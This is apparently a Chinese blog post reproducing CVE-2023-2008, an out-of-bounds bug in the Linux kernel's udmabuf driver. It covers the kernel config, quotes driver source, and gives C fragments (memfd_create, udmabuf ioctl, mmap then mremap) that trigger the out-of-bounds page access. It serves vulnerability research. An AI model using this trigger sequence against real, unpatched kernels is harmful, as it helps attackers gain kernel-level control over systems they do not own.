---
title: CVE-2023-2008复现笔记
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458572285&idx=2&sn=0222e2ed9589877a875eb5cb86056ac2&chksm=b18de57786fa6c61103d2f5c157fbdb516461dcba4b82b88daea0ed03e0c2bfbfefa1fb7d8ad&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-09-10
fetch_date: 2025-10-06T18:27:52.787440
---

# CVE-2023-2008复现笔记

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EVzOkk2XAr5SQO4LibWHyU42AibFHSEQA1EU1via1yldt3RAm8PwjMqjEIKyID3sb8O7ymr74gDWkIg/0?wx_fmt=jpeg)

# CVE-2023-2008复现笔记

mb\_btcapvow

看雪学苑

```
一

环境搭建
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIaelN9icNibKRQetgsKJxtBqcd6o03INo5o7KEM12J2H1B5OjbeicZEnfg/640?wx_fmt=png&from=appmsg)

commit：2c85ebc57b3e1817b6ce1a6b703928e113a90442

总的config：

defconfig+menuconfig

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIZUnnccqcuuheNpb5UaKV0AjciaT4TzJtprFOGtTOOYJqNGwI70XwicKA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIclGXhEzGYFM7Wa0EnbeNZwpiayeFkug5AquCIhHvttQibnSXbEkmhbTw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjI5r6LXD5azKqtIY5YjBOODneBJlQmeToPALXTia7DAmYiboyiaTox8hddQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIOib2HxIWNhVSRGQFibqpKT947HBNV82MCGvBQkGmktHNYkuib6DSIrYRQ/640?wx_fmt=png&from=appmsg)

```
CONFIG_CONFIGFS_FS=y  #支持img
CONFIG_SECURITYFS=y   #支持img
CONFIG_DEBUG_INFO=y  #调试
CONFIG_USER_NS=y   #支持新的namespace
CONFIG_USERFAULTFD=y #支持userfaultfd
CONFIG_DMABUF=y #支持udmabuf
```

(同样是修改了objtool的一个代码)

此外还需要在init脚本中给普通用户赋一个可以打开/dev/udmabuf文件的权限。

然后需要没有cg隔离，复现版本v5.10.0刚好不存在cg隔离；（笔者在复现时尽量认为是隔离的，不使用这一特性，本cve比较特殊，需要用到pipe）

```
二

漏洞分析
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjI2u4yV2C5J5SSPQJxDK87ZQTatmlX9zD7qsNqAG7NIgMxYytpsyzASQ/640?wx_fmt=png&from=appmsg)

在分配dmabuf的时候，内核会调用 dma\_buf\_export函数，其中传入一个dma\_buf\_export\_info结构体来传递相关参数信息，该结构体的定义如下：

```
struct dma_buf_export_info {
    const char *exp_name;
    struct module *owner;
    const struct dma_buf_ops *ops;
    size_t size;
    int flags;
    struct dma_resv *resv;
    void *priv;
};
```

dma\_buf\_export函数内容大致如下：

```
struct dma_buf *dma_buf_export(const struct dma_buf_export_info *exp_info)
{
    ...

[1]	dmabuf = kzalloc(alloc_size, GFP_KERNEL);
    if (!dmabuf) {
        ret = -ENOMEM;
        goto err_module;
    }

    dmabuf->priv = exp_info->priv;
    dmabuf->ops = exp_info->ops;
    dmabuf->size = exp_info->size;
    dmabuf->exp_name = exp_info->exp_name;
    dmabuf->owner = exp_info->owner;
        ...[2]	file = dma_buf_getfile(dmabuf, exp_info->flags);
    if (IS_ERR(file)) {
        ret = PTR_ERR(file);
        goto err_dmabuf;
    }

    file->f_mode |= FMODE_LSEEK;
[3]	dmabuf->file = file;

        ...
    return dmabuf;
```

之后还会调用dma\_buf\_fd等和文件相关的操作，最后返回给我们一个文件描述符；

当然我们重点要关注这里有一个分配页面空间的部分：

```
ubuf = kzalloc(sizeof(*ubuf), GFP_KERNEL);
if (!ubuf)
    return -ENOMEM;

/* calculate number of pages */
pglimit = (size_limit_mb * 1024 * 1024) >> PAGE_SHIFT;
for (i = 0; i < head->count; i++) {
    ubuf->pagecount += list[i].size >> PAGE_SHIFT;
    if (ubuf->pagecount > pglimit)
        goto err;
}

/* allocate array of page pointers */
ubuf->pages = kmalloc_array(ubuf->pagecount, sizeof(*ubuf->pages),
                    GFP_KERNEL);
if (!ubuf->pages) {
    ret = -ENOMEM;
    goto err;
}
```

如上述代码所示，这里给pages分配了一个指针数组，请记住，后边这里会出现漏洞；

```
for (i = 0; i < head->count; i++)
{
    ret = -EBADFD;
    memfd = fget(list[i].memfd);
    if (!memfd)
        goto err;
    if (!shmem_mapping(file_inode(memfd)->i_mapping))
        goto err;
    seals = memfd_fcntl(memfd, F_GET_SEALS, 0);
    if (seals == -EINVAL)
        goto err;
    ret = -EINVAL;

    /* make sure file can only be extended in size but not reduced */
    if ((seals & SEALS_WANTED) != SEALS_WANTED ||
            (seals & SEALS_DENIED) != 0)
        goto err;

    pgoff = list[i].offset >> PAGE_SHIFT;
    pgcnt = list[i].size   >> PAGE_SHIFT;

    for (pgidx = 0; pgidx < pgcnt; pgidx++) {
        /* lookup the page */
        page = shmem_read_mapping_page(
            file_inode(memfd)->i_mapping, pgoff + pgidx);
        /* add the page to the array */
        ubuf->pages[pgbuf++] = page;
    }
    fput(memfd);
    memfd = NULL;
}
```

这里我们需要注意的是dmabuf有一个ops成员，这是一个函数表，上面有若干函数指针：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIuNp31YqUUXVfN1u2IklcZFEImsbEyzAowOiccf55L8b9vrGBibSib0v0g/640?wx_fmt=png&from=appmsg)

当我们对dmafd调用mmap时就会调用到mmap\_udmabuf函数，下面我们简单看其代码：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjI9SPxq6k7icDRgSykcjqiaiaLFJOv0pdibTnwa5eqmGTQoRTgROSGe1nCQA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjI9JFgFYvBEiapzR9X10PlJLkM2OXg1juz59HUVdCiaouHP3E6yAvR9Hdw/640?wx_fmt=png&from=appmsg)

总的来看就是我们可以在kmalloc分配的obj上越界写内核地址；

```
三

几个前置知识
```

## memfd\_create

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIy6pibyZjXETtydOKFENZOdACEkk77SZa04CmsQunjEWiaUxLurIR7YMA/640?wx_fmt=png&from=appmsg)

## ftruncate

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HVKwxs8YuPCj9dz23osicjIBcdZW0vee7uMtopfuTLAy7PiadoAdOY868Az490iaVziaictlIeSUCRF2A/640?wx_fmt=png&from=appmsg)

## memfd\_create+udmabuf

在使用`udmabuf`设备之前，需要先使用`memfd_create`创建一个内存文件，然后才能创建 DMA buffer（dmabuf）。这是因为`memfd_create`和`udmabuf`的组合提供了一种机制，将用户空间内存区域转换为可用于 DMA（直接内存访问）操作的缓冲区。以下是这种操作顺序的原因及其背后的机制。

### 1.**memfd\_create 提供匿名共享内存**：

◆`memfd_create`用于创建一个匿名的、基于内存的文件，这个文件存在于内存中，而不是存储在磁盘上。

◆创建的内存文件可以通过文件描述符（file descriptor, FD）进行访问，并支持类似文件的操作（如`mmap`、`write`、`read`）。

◆内存文件提供了一块用户空间的内存区域，可以安全地共享和管理。这对于在多个进程之间共享数据或跨设备传递内存数据非常有用。

### 2.**udmabuf 将内存文件转换为 DMA 缓冲区**：

◆`udmabuf`是一个 Linux 驱动程序，它的主要功能是将一个用户空间的内存区域（通常是通过`memfd_create`创建的内存文件）转换为可以供 DMA 使用的缓冲区。

◆当你通过`memfd_create`创建内存文件后，你得到一个文件描述符，这个描述符引用了一个匿名的、驻留在内存中的文件。

◆这个文件描述符然后被传递给`udmabuf`，`udmabuf`设备将这个内存文件映射为 DMA 缓冲区。这样，内核中的 DMA 引擎（或其他硬件设备）就可以直接访问这块内存。

## udmabuf使用接口

预定义：

```
#define UDMABUF_CREATE _IOW('u', 0x42, struct udmabuf_create)
```

memfd\_create及其相关处理：

```
int mem_fd = memfd_create("test", MFD_ALLOW_SEALING);
  if (mem_fd < 0)
    errx(1, "couldn't create anonymous file");

  /* setup size of anonymous file, the initial size was 0 */
  if (ftruncate(mem_fd,0x1000 * 8) < 0)
    errx(1, "couldn't truncate file length");

  /* make sure the file cannot be reduced in size */
  if (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) < 0)
    errx(1, "couldn't seal file");

  printf("[*] anon file fd=%d (%#x bytes)\n", mem_fd, 0x1000 * 8);
```

打开设备文件：

```
int dev_fd = open("/dev/udmabuf", O_RDWR);
  if (dev_fd < 0)
    errx(1, "couldn't open device");

  printf("[*] udmabuf device fd=%d\n", dev_fd);
```

然后通过设备文件获取一个udmabuf：

```
struct udmabuf_create create = { 0 };
    create.memfd = mem_fd;
    create.size  = PAGE_SIZE * N_PAGES_ALLOC;

    /* reallocate one of the freed holes in kmalloc-1024 */
    int udmabuf_fd = ioctl(dev_fd, UDMABUF_CREATE, &create);
    if (udmabuf_fd < 0)
      errx(1, "couldn't create udmabuf");

    printf("[*] udmabuf fd=%d\n", udmabuf_fd);
```

通过mmap进行映射：

```
void* udmabuf_map = mmap(NULL, PAGE_SIZE * N_PAGES_ALLOC,
        PROT_READ|PROT_WRITE, MAP_SHARED, udmabuf_fd, 0);
    if (udmabuf_map == MAP_FAILED)
      errx(1, "couldn't map udmabuf");

    printf("[*] udmabuf mapped at %p (%#x bytes)\n",
        udmabuf_map, PAGE_SIZE * N_PAGES_ALLOC);
```

通过mremap进行扩展：

```
/* remap the virtual mapping expanding its size */
    void* new_udmabuf_map = mremap(udmabuf_map,
        PAGE_SIZE * N_PAGES_ALLOC, PAGE_SIZE * N_PAGES_ALLOC * 2, MREMAP_MAYMOVE);
    if (new_udmabuf_map == MAP_FAILED)
      errx(1, "couldn't remap udmabuf mapping");

    printf("[*] udmabuf map expanded at %p (%#x bytes)\n", new_udmabuf_map,
        PAGE_SIZE * N_PAGES_ALLOC * 2);
```

#

```
四

原因深入分析
```

笔者在写这部分的时候已经完全复现成功该漏洞；

依据复现过程来看，似乎是dmabuf一经创建就会在其数组中写入若干个内核地址，然后mmap时会与用户空间进行映射，而mremap似乎并没有对这个数组做任何处理，仅仅是放宽了边界条件，使得我们访问的时候不算越界；导致我们越界访问的时候会自动读取数组下面的非法数据作为page\_struct；

那么问题来了，这个dma访问内存是否还是一句页表呢？看起来这个访问映射似乎与页表逻辑是不相符的；那么ops函数表中的函数对mmap到底是怎么处理的呢？

源代码路径：

```
https://elixir.bootlin.com/linux/v5.10/source/drivers/dma-buf/udmabuf.c
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1...